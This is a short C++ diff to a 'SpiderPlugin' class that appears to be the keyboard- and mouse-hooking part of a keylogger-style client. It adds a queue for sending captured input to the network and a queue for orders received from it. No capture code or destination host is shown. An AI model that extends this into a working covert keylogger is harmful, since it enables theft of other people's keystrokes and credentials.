@@ -14,7 +14,11 @@ namespace client
 {
 namespace library
 {
-SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(false)
+
+mt::Queue<SystemMsg> *SpiderPlugin::m_sendToNetwork = nullptr;
+
+SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(false),
+                               m_receivedFromNetwork()
 #if defined _WIN32
                                ,
                                m_keyboardHookWin(nullptr),
@@ -27,9 +31,11 @@ SpiderPlugin::~SpiderPlugin()
 {
 }
 
-bool SpiderPlugin::init()
+bool SpiderPlugin::init(mt::Queue<SystemMsg> &inputQueue)
 {
     bool ret;
+
+    m_sendToNetwork = &inputQueue;
 #if defined _WIN32
     ret = initWindows();
 #elif defined __APPLE__
@@ -38,6 +44,11 @@ bool SpiderPlugin::init()
     ret = initLinux();
 #endif
     return ret;
+}
+
+mt::Queue<SystemMsg> &SpiderPlugin::getOrderQueue()
+{
+    return m_receivedFromNetwork;
 }
 
 bool SpiderPlugin::deinit()
